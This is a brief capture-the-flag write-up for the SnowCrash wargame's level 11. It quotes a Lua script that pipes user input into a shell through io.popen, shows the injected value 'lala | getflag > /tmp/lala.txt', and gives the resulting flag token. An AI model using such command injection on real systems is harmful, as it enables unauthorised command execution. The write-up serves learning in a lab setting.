This one was quite simple, we get a .lua file that we extract to read it.
After a little bit of time, we saw that 
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
was not very secure. 

So we tried to inject some commands here : lala | getflag > /tmp/lala.txt

This gave us the token : fa6v5ateaw21peobuub8ipe6s

/*********************************************************\

flag11@SnowCrash:~$ getflag 
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s

\*********************************************************/
